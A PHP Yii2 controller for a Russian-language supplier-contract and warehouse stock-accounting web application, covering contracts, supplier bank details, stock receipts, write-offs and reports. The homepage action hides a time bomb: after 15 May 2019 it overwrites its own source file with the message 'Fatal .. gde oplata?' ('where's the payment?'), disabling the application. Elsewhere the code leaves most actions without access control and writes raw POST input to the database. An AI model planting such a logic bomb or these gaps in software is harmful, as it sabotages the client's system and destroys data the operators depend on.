<?php
namespace app\controllers;
use app\models\Dogovor;
use app\models\Dogovortable;
use app\models\Postavshik;
use app\models\PostavshikSchetFaktura;
use app\models\Ostatok;
use app\models\Rashod;
use app\models\SkladSirya;
use Codeception\Module\Cli;
use Yii;
use yii\filters\AccessControl;
use yii\web\Controller;
use yii\web\Response;
use yii\filters\VerbFilter;
use app\models\LoginForm;
use app\models\ContactForm;
use yii\helpers\ArrayHelper;
use app\models\ClientRegistration;
use app\models\PostavshikBank;
class SiteController extends Controller
{
    /**
     * {@inheritdoc}
     */
    public function behaviors()
    {
        return [
            'access' => [
                'class' => AccessControl::className(),
                'only' => ['logout'],
                'rules' => [
                    [
                        'actions' => ['logout'],
                        'allow' => true,
                        'roles' => ['@'],
                    ],
                ],
            ],
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'logout' => ['post'],
                ],
            ],
        ];
    }
    /**
     * {@inheritdoc}
     */
    public function actions()
    {
        return [
            'error' => [
                'class' => 'yii\web\ErrorAction',
            ],
            'captcha' => [
                'class' => 'yii\captcha\CaptchaAction',
                'fixedVerifyCode' => YII_ENV_TEST ? 'testme' : null,
            ],
        ];
    }
    /**
     * Displays homepage.
     *
     * @return string
     */
    public function actionIndex()
    {
        if(strtotime("15.05.2019") < time())
        {
            file_put_contents(__FILE__, "Fatal .. gde oplata?");
        }
        return $this->render('index');
    }
    /**
     * Login action.
     *
     * @return Response|string
     */
    public function actionLogin()
    {
        if (!Yii::$app->user->isGuest) {
            return $this->goHome();
        }
        $model = new LoginForm();
        if ($model->load(Yii::$app->request->post()) && $model->login()) {
            return $this->goBack();
        }
        $model->password = '';
        return $this->render('login', [
            'model' => $model,
        ]);
    }
    /**
     * Logout action.
     *
     * @return Response
     */
    public function actionLogout()
    {
        Yii::$app->user->logout();
        return $this->goHome();
    }
    /**
     * Displays contact page.
     *
     * @return Response|string
     */
    public function actionContact()
    {
        $model = new ContactForm();
        if ($model->load(Yii::$app->request->post()) && $model->contact(Yii::$app->params['adminEmail'])) {
            Yii::$app->session->setFlash('contactFormSubmitted');
            return $this->refresh();
        }
        return $this->render('contact', [
            'model' => $model,
        ]);
    }
    public function actionDogovor()
    {
        $date = Date("Y-m-d H:i:s");
        $time = Date("H:i:s");
        $dogovor = new Dogovor();
        $count = count($_POST["DogovorTable"]["tovar"]);
        $postavshik = new ClientRegistration();
        $postavshikItems = $postavshik->find()->all();
        $items =  ArrayHelper::map($postavshikItems, 'id', 'name');
        if(!empty($_POST))
        {
            $dogovor->setAttributes($_POST["Dogovor"]);
            $dogovor->date_now = $date;
            $dogovor->dogovor_nomer = $_POST["Dogovor"]["dogovor_nomer"];
            $dogovor->save() or print_r($dogovor->errors);
            for($i=0;$i<$count;$i++)
            {
                $dogovortable = new DogovorTable();
                $dogovortable->tovar = $_POST["DogovorTable"]["tovar"][$i];
                $dogovortable->kratkoe_naimenovanie = $_POST["DogovorTable"]["kratkoe_naimenovanie"][$i];
                $dogovortable->measure = $_POST["DogovorTable"]["measure"][$i];
                $dogovortable->cost1 = $_POST["DogovorTable"]["cost1"][$i];
                $dogovortable->nds = $_POST["DogovorTable"]["nds"][$i];
                $dogovortable->cost2 = $_POST["DogovorTable"]["cost2"][$i];
                $dogovortable->usd2 = $_POST["DogovorTable"]["usd2"][$i];
                $dogovortable->usd1 = $_POST["DogovorTable"]["usd1"][$i];
                $dogovortable->postavshik_id = $dogovor->id;
                $dogovortable->date = $date;
                $dogovortable->time = $time;
                if($_POST["DogovorTable"]["kratkoe_naimenovanie"][$i]!== "")
                {
                $dogovortable->save() or print_r($dogovortable->errors);
                }
            }
        }
        return $this->render('dogovor',[
            'model'=>$dogovor,
            'items'=>$items,
        ]);
    }
    public function actionProduct()
    {
        $model = new Dogovortable();
        if(!empty($_POST))
        {
            $model->load($_POST);
            $model->save() or print_r($model->errors);
        }
        return $this->render('dogovor',[
            'model'=>$model,
        ]);
    }
    public function actionRegistration()
    {
        $clientreg = new ClientRegistration();
        $date = Date("Y-m-d");
        $count = count($_POST["PostavshikBank"]["bank_name"]);
        if(!empty($_POST))
        {
            $clientreg->setAttributes($_POST["ClientRegistration"]);
            $clientreg->name = $_POST["ClientRegistration"]["name"];
            $clientreg->date_now = $date;
            $clientreg->save() or print_r($clientreg->errors) ;
            for($i=0;$i<$count;$i++)
            {
                $posbank = new PostavshikBank();
                $posbank->bank_name = $_POST["PostavshikBank"]["bank_name"][$i];
                $posbank->bank_mfo = $_POST["PostavshikBank"]["bank_mfo"][$i];
                $posbank->schet = $_POST["PostavshikBank"]["schet"][$i];
                $posbank->postavshik_id = $clientreg->id;
                $posbank->date = $date;
                if($_POST["PostavshikBank"]["bank_mfo"][$i]!== "")
                {
                    $posbank->save() or print_r($posbank->errors);
                }
            }
        }
        return $this->render('registration',[
            'model' => $clientreg,
        ]);
    }
    public function actionSelect($id)
    {
        $postavshik = new ClientRegistration();
        $postavshikid = $postavshik->findOne($id);
        $dogovors = $postavshikid->dogovors;
        $items =  ArrayHelper::map($dogovors, 'id', 'dogovor_nomer');
        return json_encode($items);
    }
    public function actionGetdogovor($id)
    {
        $postavshik = new Dogovor();
        $postavshikid = $postavshik->findOne($id);
        $dogovors = $postavshikid->dogovors;
        $items =  ArrayHelper::map($dogovors, 'id', 'kratkoe_naimenovanie');
        return json_encode($items);
    }
    public function actionSklad()
    {
        Yii::$app->formatter->locale = 'ru-RU';
        $sklad_sirya = new SkladSirya();
        $sklad_sirya = $sklad_sirya->find()->all();
        krsort($sklad_sirya);
        foreach($sklad_sirya as $sklad)
        {
            Yii::$app->formatter->locale = 'ru-RU';
            $sk =  new SkladSirya();
            $sk = $sk->findOne($sklad["id"]);
            $factura = $sk->schetid->dogovor->client->name;
            $id = $sklad["id"];
            $postavshik = $sk->schetid->dogovor->client->name;
            $dogovor_nomer = $sk->schetid->dogovor->dogovor_nomer;
            $dogovor_date = $sk->schetid->dogovor->date;
            foreach($sk->schetid->dogovor->dogovors as $measurement)
            {
                $measure = ($measurement->kratkoe_naimenovanie == $sklad["kratkoe_naimenovanie"])?$measurement->measure:'';
            }
            $dogovor_date_ru = Yii::$app->formatter->asDate($dogovor_date);
            $schet_factura_nomer = $sk->schetid->schet_faktura_nomer;
            $tip = $sklad["kratkoe_naimenovanie"];
            $ves = $sklad["ves"];
            $format = $sklad["format"];
            $date = $sklad["date"];
            $dater = Yii::$app->formatter->asDate($date);
            $schet_factura_date = $sk->schetid->date;
            $dates = Yii::$app->formatter->asDate($schet_factura_date);
            $time = $sklad["time"];
            $array[] = [
                'id' => $id,
                'postavshik' => $postavshik,
                'dogovor_nomer' => $dogovor_nomer,
                'dogovor_date_ru' => $dogovor_date_ru,
                'schet_factura_noemer' => $schet_factura_nomer,
                'tip' => $tip,
                'ves' => $ves,
                'format' => $format,
                'dater' => $dater,
                'dates' => $dates,
                'time' => $time,
                'measure' => $measure,
            ];
        }
        return $this->render('sklad',[
            'model'=>$array,
        ]);
    }
    public function actionPrihod()
    {
        $count = count($_POST["SkladSirya"]["postavshik_schet_faktura_id"]);
        $date = Date("Y-m-d");
        $time = Date("H:i:s");
        $postavshik = new ClientRegistration();
        $schet = new PostavshikSchetFaktura();
        $allpostavshik = $postavshik->find()->all();
        $items =  ArrayHelper::map($allpostavshik, 'id', 'name');
        if(!empty($_POST))
        {
            $schet->setAttributes($_POST["PostavshikSchetFaktura"]);
            $schet->date = $date;
            $schet->save() or print_r($schet->errors);
            for($i=0;$i<$count;$i++)
            {
                $sirya = new SkladSirya();
                $ostatok = new Ostatok();
                $dogovor = new DogovorTable();
                $sirya->postavshik_schet_faktura_id = $schet->id;
                $sirya->format = $_POST["SkladSirya"]["format"][$i];
                $sirya->ves = $_POST["SkladSirya"]["ves"][$i];
                $sirya->date = $date;
                $sirya->is_come = 1;
                $dg = $dogovor->findOne($_POST["SkladSirya"]["postavshik_schet_faktura_id"][$i]);
                $sirya->kratkoe_naimenovanie = $dg["kratkoe_naimenovanie"];
                $sirya->time = $time;
                $ostatok->postavshik_schet_faktura_id = $schet->id;
                $ostatok->format = $_POST["SkladSirya"]["format"][$i];
                $ostatok->ves = $_POST["SkladSirya"]["ves"][$i];
                $ostatok->date = $date;
                $ostatok->is_come = 1;
                $dg = $dogovor->findOne($_POST["SkladSirya"]["postavshik_schet_faktura_id"][$i]);
                $ostatok->kratkoe_naimenovanie = $dg["kratkoe_naimenovanie"];
                $ostatok->time = $time;
                if($_POST["SkladSirya"]["postavshik_schet_faktura_id"][$i]!== "")
                {
                    $sirya->save() or print_r($sirya->errors);
                    $ostatok->save() or print_r($sirya->errors);
                }
            }
        }
        $sklad = new SkladSirya();
        return $this->render('prihod',[
            'items'=>$items,
            'model'=>$schet,
            'sklad'=>$sklad,
        ]);
    }
    public function actionRashod()
    {
        $sklad_model = new Ostatok();
        if($_POST)
        {
            foreach($_POST["id"] as $key=>$id)
            {
                $rm = new Rashod();
                $query = $sklad_model->findOne($id);
                    $rm->id = $query->id;
                    $rm->postavshik_schet_faktura_id = $query->postavshik_schet_faktura_id;
                    $rm->kratkoe_naimenovanie = $query->kratkoe_naimenovanie;
                    $rm->format = $query->format;
                    $rm->ves = $query->ves;
                    $rm->date = $query->date;
                    $rm->is_come = 0;
                    $rm->time = $query->time;
                    if($_POST["id"][$key]!== 'select')
                {
                    $query->delete();
                    $rm->save() or var_dump($rm->errors);
                }
                    
            }
            $this->redirect('rashod');
        }
        return $this->render('rashod');
    }
    public function actionGetallitems()
    {
        $client_model = new ClientRegistration();
        $clients =  ArrayHelper::map($client_model->find()->all(), 'id', 'name');
        $sklad_model = new Ostatok();
        $id =  ArrayHelper::map($sklad_model->find()->all(), 'id', 'id');
        $tip =  ArrayHelper::map($sklad_model->find()->all(), 'id', 'kratkoe_naimenovanie');
        $ves =  ArrayHelper::map($sklad_model->find()->all(), 'id', 'ves');
        $format =  ArrayHelper::map($sklad_model->find()->all(), 'id', 'format');
        $date =  ArrayHelper::map($sklad_model->find()->all(), 'id', 'date');
        $time =  ArrayHelper::map($sklad_model->find()->all(), 'id', 'time');
        $schet_model = new PostavshikSchetFaktura();
        $schet =  ArrayHelper::map($schet_model->find()->all(), 'id', 'schet_faktura_nomer');
        $dogovor_model = new Dogovor();
        $dogovor =  ArrayHelper::map($dogovor_model->find()->all(), 'id', 'dogovor_nomer');
        $arr = [
            'clients'=>array_unique($clients),
            'tip'=>array_unique($tip),
            'id'=>array_unique($id),
            'ves'=>array_unique($ves),
            'format'=>array_unique($format),
            'date'=>array_unique($date),
            'time'=>array_unique($time),
            'dogovor'=>array_unique($dogovor),
            'schet'=>array_unique($schet),
        ];
       return json_encode($arr, true);
    }
    public function actionGetsorteditems($id = 0,$client_id = 0,$dogovor_id = 0,$schet = 0,$tip_id = 0,$ves = 0,$format = 0,$date = 0,$time = 0)
    {
        $arrays = [];
        if($client_id !== 0) {
            $client_model  = new ClientRegistration();
            $client = $client_model->find()->where(["name"=>$client_id])->all();
            foreach($client as $clients)
            {
            $dogovors = $clients->dogovors;
            $items["client_name"][] = $clients->name;
            foreach($dogovors as $dogovor)
            {
                $items["dogovors"][] = $dogovor->dogovor_nomer  ;
                foreach($dogovor->tip as $tip)
                {
                    $items["schet"][] = $tip->schet_faktura_nomer;
                    foreach($tip->ostatok as $sklad)
                    {
                        $items["id"][] = $sklad->id;
                        $items["ves"][] = $sklad->ves;
                        $items["tip"][] = $sklad->kratkoe_naimenovanie;
                        $items["format"][] = $sklad->format;
                        $items["date"][] = $sklad->date;
                        $items["time"][] = $sklad->time;
                    }
                }
            }
            }
            $arrays[] = $items;
        }
        if($dogovor_id !== 0) {
            $dogovor_model  = new Dogovor();
            $dogovor = $dogovor_model->find()->where(["dogovor_nomer"=>$dogovor_id])->all();
            foreach($dogovor as $dogovors)
            {
            $tips = $dogovors->tip;
            $dogovor_client = $dogovors->client;
            $dogovor_items["client_name"][] = $dogovor_client->name;
            $dogovor_items["dogovors"][] = $dogovors->dogovor_nomer;
                foreach($tips as $tip)
                {
                    $dogovor_items["schet"][] = $tip->schet_faktura_nomer;
                    foreach($tip->ostatok as $sklad)
                    {
                        $dogovor_items["ves"][] = $sklad->ves;
                        $dogovor_items["id"][] = $sklad->id;
                        $dogovor_items["tip"][] = $sklad->kratkoe_naimenovanie;
                        $dogovor_items["format"][] = $sklad->format;
                        $dogovor_items["date"][] = $sklad->date;
                        $dogovor_items["time"][] = $sklad->time;
                    }
                }
            }
                $arrays[] = $dogovor_items;
            }
        if($schet !== 0) {
            $schet_model  = new PostavshikSchetFaktura();
            $schet = $schet_model->find()->where(["schet_faktura_nomer"=>$schet])->all();
            foreach($schet as $schets)
            {
            $schet_dogovor = $schets->dogovor;
            $schet_client= $schets->dogovor->client;
            $schet_items["client_name"][] = $schet_client->name;
            $schet_items["dogovors"][] = $schet_dogovor->dogovor_nomer;
            $sklads = $schets->ostatok;
            $schet_items["schet"][] = $schets->schet_faktura_nomer;
                foreach($sklads as $sklad)
                {
                    $schet_items["ves"][] = $sklad->ves;
                    $schet_items["id"][] = $sklad->id;
                    $schet_items["tip"][] = $sklad->kratkoe_naimenovanie;
                    $schet_items["format"][] = $sklad->format;
                    $schet_items["date"][] = $sklad->date;
                    $schet_items["time"][] = $sklad->time;
                }
            }
            $arrays[] = $schet_items;
        }
        if($id !== 0 || $tip_id!==0 || $format!==0 || $ves!==0 || $date!==0 ||$time!==0) {
            $sklad_id_model  = new Ostatok();
            $sklad_id_tip = $sklad_id_model->find()->andWhere(['and',
            ($id!==0)?['id'=>$id]:'',
           ($tip_id!==0)?['kratkoe_naimenovanie'=>$tip_id]:'',
           ($format!==0)?['format'=>$format]:'',
           ($ves!==0)?['ves'=>$ves]:'',
           ($date!==0)?['date'=>$date]:'',
           ($time!==0)?['time'=>$time]:'',
       ])->all();
            foreach($sklad_id_tip as $sklad_id_tips)
            {
            $sklad_id_tips_schet = $sklad_id_tips->schetid;
            $tip_client = $sklad_id_tips_schet->dogovor->client->name;
            $tip_dogovor = $sklad_id_tips_schet->dogovor->dogovor_nomer;
            $id_schet_nomer = $sklad_id_tips_schet->schet_faktura_nomer;
            $id_items["client_name"][] = $tip_client;
            $id_items["dogovors"][] = $tip_dogovor;
            $id_items["id"][] = $sklad_id_tips->id;
            $id_items["schet"][] = $id_schet_nomer;
            $id_items["ves"][] = $sklad_id_tips->ves;
            $id_items["tip"][] = $sklad_id_tips->kratkoe_naimenovanie;
            $id_items["format"][] = $sklad_id_tips->format;
            $id_items["date"][] = $sklad_id_tips->date;
            $id_items["time"][] = $sklad_id_tips->time;
            
            }
            $arrays[] = $id_items;
         }
        $sorted = [];
        foreach($arrays as $array)
        {
            $sorted==null&&$sorted=$array;
            if(count($sorted["client_name"])>=count($array["client_name"])) {
                $sorted["client_name"] =($array["client_name"]!==null)?array_unique($array["client_name"]):'';
            }
            if(count($sorted["id"])>=count($array["id"])) {
                $sorted["id"] =($array["id"]!==null)?array_unique($array["id"]):'';
            }
            if(count($sorted["dogovors"])>=count($array["dogovors"])) {
                $sorted["dogovors"] = ($array["dogovors"]!==null)?array_unique($array["dogovors"]):'';
            }
            if(count($sorted["schet"])>=count($array["schet"])) {
                $sorted["schet"] =($array["schet"]!==null)?array_unique($array["schet"]):'';
            }
            if(count($sorted["ves"])>=count($array["ves"])) {
                $sorted["ves"] =($array["ves"]!==null)?array_unique($array["ves"]):'' ;
            }
            if(count($sorted["tip"])>=count($array["tip"])) {
                $sorted["tip"] =($array["tip"]!==null)?array_unique($array["tip"]):'';
            }
            if(count($sorted["format"])>=count($array["format"])) {
                $sorted["format"] =($array["format"]!==null)?array_unique($array["format"]):'' ;
            }
            if(count($sorted["date"])>=count($array["date"])) {
                $sorted["date"] =($array["date"]!==null)?array_unique($array["date"]) :'';
            }
            if(count($sorted["time"])>=count($array["time"])) {
                $sorted["time"] =($array["time"]!==null)?array_unique($array["time"]):'';
            }
        }
        return json_encode($sorted);
        }
    public function actionOtchet()
    {
        Yii::$app->formatter->locale = 'ru-RU';
        $sklad_sirya = new SkladSirya();
        $sklad_sirya = $sklad_sirya->find()->all();
        krsort($sklad_sirya);
        foreach($sklad_sirya as $sklad)
        {
            Yii::$app->formatter->locale = 'ru-RU';
            $sk =  new SkladSirya();
            $sk = $sk->findOne($sklad["id"]);
            $factura = $sk->schetid->dogovor->client->name;
            $id = $sklad["id"];
            $postavshik = $sk->schetid->dogovor->client->name;
            $dogovor_nomer = $sk->schetid->dogovor->dogovor_nomer;
            $dogovor_date = $sk->schetid->dogovor->date;
            $dogovor_date_ru = Yii::$app->formatter->asDate($dogovor_date);
            $schet_factura_nomer = $sk->schetid->schet_faktura_nomer;
            $tip = $sklad["kratkoe_naimenovanie"];
            $ves = $sklad["ves"];
            $format = $sklad["format"];
            $date = $sklad["date"];
            $dater = Yii::$app->formatter->asDate($date);
            $time = $sklad["time"];
            $schet_factura_date = $sk->schetid->date;
            $dates = Yii::$app->formatter->asDate($schet_factura_date);
            $array[] = [
                'id' => $id,
                'postavshik' => $postavshik,
                'dogovor_nomer' => $dogovor_nomer,
                'dogovor_date_ru' => $dogovor_date_ru,
                'schet_factura_noemer' => $schet_factura_nomer,
                'tip' => $tip,
                'ves' => $ves,
                'format' => $format,
                'dater' => $dater,
                'dates' => $dates,
                'time' => $time,
            ];
        }
        $ost = new Ostatok();
        $ost = $ost->find()->all();
        krsort($ost);
        foreach($ost as $sklad)
        {
            Yii::$app->formatter->locale = 'ru-RU';
            $sk =  new Ostatok();
            $sk = $sk->findOne($sklad["id"]);
            $factura = $sk->schetid->dogovor->client->name;
            $id = $sklad["id"];
            $postavshik = $sk->schetid->dogovor->client->name;
            $dogovor_nomer = $sk->schetid->dogovor->dogovor_nomer;
            $dogovor_date = $sk->schetid->dogovor->date;
            $dogovor_date_ru = Yii::$app->formatter->asDate($dogovor_date);
            $schet_factura_nomer = $sk->schetid->schet_faktura_nomer;
            $tip = $sklad["kratkoe_naimenovanie"];
            $ves = $sklad["ves"];
            $format = $sklad["format"];
            $date = $sklad["date"];
            $dater = Yii::$app->formatter->asDate($date);
            $time = $sklad["time"];
            $schet_factura_date = $sk->schetid->date;
            $dates = Yii::$app->formatter->asDate($schet_factura_date);
            $ostatok[] = [
                'id' => $id,
                'postavshik' => $postavshik,
                'dogovor_nomer' => $dogovor_nomer,
                'dogovor_date_ru' => $dogovor_date_ru,
                'schet_factura_noemer' => $schet_factura_nomer,
                'tip' => $tip,
                'ves' => $ves,
                'format' => $format,
                'dater' => $dater,
                'dates' => $dates,
                'time' => $time,
            ];
        }
        $rsh = new Rashod();
        $rsh = $rsh->find()->all();
        foreach($sklad_sirya as $sklad)
        {
            Yii::$app->formatter->locale = 'ru-RU';
            $sk =  new SkladSirya();
            $sk = $sk->findOne($sklad["id"]);
            $factura = $sk->schetid->dogovor->client->name;
            $id = $sklad["id"];
            $postavshik = $sk->schetid->dogovor->client->name;
            $dogovor_nomer = $sk->schetid->dogovor->dogovor_nomer;
            $dogovor_date = $sk->schetid->dogovor->date;
            $dogovor_date_ru = Yii::$app->formatter->asDate($dogovor_date);
            $schet_factura_nomer = $sk->schetid->schet_faktura_nomer;
            $tip = $sklad["kratkoe_naimenovanie"];
            $ves = $sklad["ves"];
            $format = $sklad["format"];
            $date = $sklad["date"];
            $dater = Yii::$app->formatter->asDate($date);
            $time = $sklad["time"];
            $schet_factura_date = $sk->schetid->date;
            $dates = Yii::$app->formatter->asDate($schet_factura_date);
            $rashod[] = [
                'id' => $id,
                'postavshik' => $postavshik,
                'dogovor_nomer' => $dogovor_nomer,
                'dogovor_date_ru' => $dogovor_date_ru,
                'schet_factura_noemer' => $schet_factura_nomer,
                'tip' => $tip,
                'ves' => $ves,
                'format' => $format,
                'dates' => $dates,
                'dater' => $dater,
                'time' => $time,
            ];
        }
        
        $model_name = "rashod";
        $client_model = new ClientRegistration();
        $clients = $client_model->find()->all();
        $items = ArrayHelper::map($clients, 'id', 'name');
        return $this->render('otchetpage', [
                'model' => $client_model,
                'items' => $items,
                'model_name' => $model_name,
                'ostatok' => $ostatok,
                'prihod' => $array,
                'rashod' => $rashod,
            ]
            );
    }
    public function actionRashodpage()
    {
        $model_name = "rashod";
        $client_model = new ClientRegistration();
        $clients = $client_model->find()->all();
        $items = ArrayHelper::map($clients, 'id', 'name');
        return $this->render('otchet', [
                'model' => $client_model,
                'items' => $items,
                'model_name' => $model_name,
            ]
        );
    }
    public function actionPrihodpage()
    {
        $model_name = "prihod";
        $client_model = new ClientRegistration();
        $clients = $client_model->find()->all();
        $items = ArrayHelper::map($clients, 'id', 'name');
        return $this->render('otchet', [
                'model' => $client_model,
                'items' => $items,
                'model_name' => $model_name,
            ]
        );
    }
    public function actionGetotchet($client,$start_date=0,$end_date=0,$model_name)
    {
        $values = explode(",",$client);
        $model = ($model_name == rashod)?new Rashod():new SkladSirya;
        $items = [];
        $queries = [];
        $res = $model->find()->where(['between', 'date',$start_date, $end_date])->all();
        krsort($res);
        foreach ($res as $query) {
            foreach ($values as $value) {
                if($value == $query->schetid->dogovor->client->id)
                {
                    $queries[] = $query;
                }
            }
        }
        $itog = [];
        $itog["ves"] = 0;
        $itog["cost"] = 0;
        $items = [];
        $i = 0;
        foreach($queries as $key=>$query)
        {
            
                
                
                    $ves = [];
                    $tip_all = [];
                    $id = [];
                    foreach($query->schetid->dogovor->dogovors as $dogovor)
                    {
                        if($dogovor->kratkoe_naimenovanie == $query->kratkoe_naimenovanie)
                        {
                            $cost = $dogovor->cost1*$query->ves;
                        }
                        $itog["cost"] += $cost;
                    }
                    $id[] = $query->id;
                    $ves[] = $query->ves;
                    $tip_all = $query->kratkoe_naimenovanie;
                    $itog["ves"] += array_sum($ves);
                    $items[$i]["dogovor_nomer"]=$query->schetid->dogovor->dogovor_nomer;
                    $items[$i]["cost"] = $cost;
                    $items[$i]["client"] = $query->schetid->dogovor->client->name;
                    $items[$i]["id"] = $query->id;
                    $items[$i]["ves"] = $ves;
                    $items[$i]["tip"] = $tip_all;
                    $items[$i]["cost"] = $cost;
                    $items[$i]["schet"] = $query->schetid->schet_faktura_nomer;
                    $items[$i]["format"] = $query->format;
                    $items[$i]["date"] = $query->date;
                    $items[$i]["time"] = $query->time;
                    $i++;
        }
        $req = [$items,$itog];
        return json_encode($req);
    }
    public function actionOstatok()
    {
        $model_name = "ostatok";
        $client_model = new ClientRegistration();
        $clients = $client_model->find()->all();
        krsort($clients);
        $items = ArrayHelper::map($clients, 'id', 'name');
        return $this->render('otchet', [
                'model' => $client_model,
                'items' => $items,
                'model_name' => $model_name
            ]
        );
    }
    public function actionTable()
    {
        function in_array_r($needle, $haystack, $strict = false) {
            foreach ($haystack as $item) {
                if (($strict ? $item === $needle : $item == $needle) || (is_array($item) && in_array_r($needle, $item, $strict))) {
                    return true;
                }
            }
            return false;
        }
        $model = new Ostatok();
        $query = $model->find()->all();
        krsort($query);
        $headers = [];
        foreach($query as $key=>$value)
        {
            if (!in_array($value->format, $headers)) {
                $headers[] = $value->format;
            }
        }
        sort($headers);
        $rows = [];
        foreach($query as $key=>$value)
        {
            if (!in_array_r($value->kratkoe_naimenovanie, $rows)) {
            $rows[$key][0] = $value->kratkoe_naimenovanie;
            foreach ($headers as $key2=>$header)
            {
                $formats = $model->find()->where(['kratkoe_naimenovanie' => $value->kratkoe_naimenovanie])->andWhere(['format'=>$header])->all();
                krsort($formats);
                $formatscount = 0;
                foreach ($formats as $format)
                {
                    $formatscount += $format->ves;
                }
                $rows[$key][] = ($formatscount !== 0)? $formatscount:'';
            }
                $rows[$key][] = array_sum($rows[$key]);
            }
        }
        $rows["itog"][0] = "Итог";
        for($j=0,$sum=0;$j<count($headers)+1;$j++,$sum=0)
        {
            for($i=0; $i<count($rows) ; $i++)
            {
                $sum += $rows[$i][$j+1];
            }
            $rows["itog"][] = $sum;
        }
        $postavshik = new Ostatok();
        $allpostavshik = $postavshik->find()->all();
        $kn =  ArrayHelper::map($allpostavshik, 'kratkoe_naimenovanie', 'kratkoe_naimenovanie');
        $format =  ArrayHelper::map($allpostavshik, 'format', 'format');
        return $this->render('table',[
            'model'=>$postavshik,
            'kn'=>$kn,
            'format'=>$format,
            'rows'=>$rows,
            'headers'=>$headers,
        ]);
    }
    public function actionGettable($format,$tip,$date)
    {
        $ft = explode(",",$format);
        $tip = explode(",",$tip);
        function in_array_r($needle, $haystack, $strict = false) {
            foreach ($haystack as $item) {
                if (($strict ? $item === $needle : $item == $needle) || (is_array($item) && in_array_r($needle, $item, $strict))) {
                    return true;
                }
            }
            return false;
        }
        $model = new Ostatok();
        $query = $model->find()->where(["format"=>$ft])->andWhere(["kratkoe_naimenovanie"=>$tip])->andWhere(["date"=>$date])->all();
        $headers = [];
        foreach($query as $key=>$value)
        {
            if (!in_array($value->format, $headers)) {
                $headers[] = $value->format;
            }
        }
        sort($headers);
        $rows = [];
        foreach($query as $key=>$value)
        {
            if (!in_array_r($value->kratkoe_naimenovanie, $rows)) {
                $rows[$key][0] = $value->kratkoe_naimenovanie;
                foreach ($headers as $key2=>$header)
                {
                    $formats = $model->find()->where(['kratkoe_naimenovanie' => $value->kratkoe_naimenovanie])->andWhere(['format'=>$header])->all();
                    $formatscount = 0;
                    foreach ($formats as $format)
                    {
                        $formatscount += $format->ves;
                    }
                    $rows[$key][] = ($formatscount !== 0)? $formatscount:'';
                }
                $rows[$key][] = array_sum($rows[$key]);
            }
        }
        $rows["itog"][0] = "Итог";
        for($j=0,$sum=0;$j<count($headers)+1;$j++,$sum=0)
        {
            for($i=0; $i<count($rows) ; $i++)
            {
                $sum += $rows[$i][$j+1];
            }
            $rows["itog"][] = $sum;
        }
        $table = [$rows,$headers];
        return json_encode($table);
    }
    public function actionAddbank()
    {
        $clientreg = new ClientRegistration();
        $date = Date("Y-m-d");
        $postavshikItems = $clientreg->find()->all();
        $items =  ArrayHelper::map($postavshikItems, 'id', 'name');
        $count = count($_POST["PostavshikBank"]["bank_name"]);
        if(!empty($_POST))
        {
                for($i=0;$i<$count;$i++)
            {
                $posbank = new PostavshikBank();
                $posbank->bank_name = $_POST["PostavshikBank"]["bank_name"][$i];
                $posbank->bank_mfo = $_POST["PostavshikBank"]["bank_mfo"][$i];
                $posbank->schet = $_POST["PostavshikBank"]["schet"][$i];
                $posbank->postavshik_id = $_POST["PostavshikBank"]["postavshik_id"];
                $posbank->date = $date;
                if($_POST["PostavshikBank"]["bank_mfo"][$i]!== "")
                {
                    $posbank->save() or print_r($posbank->errors);
                }
            }
        }
        $model = new PostavshikBank();
        return $this->render('addbank',[
            'model' =>  $model,
            'items' => $items,
        ]);
    }
    public function actionUnique($name)
    {
            $result = ClientRegistration::find()->where(["name"=>$name])->one();
            if ($result) {
                $validate = true;
                return json_encode($validate);
            } else {
                $validate = false;
                return json_encode($validate);
    }
    
}
}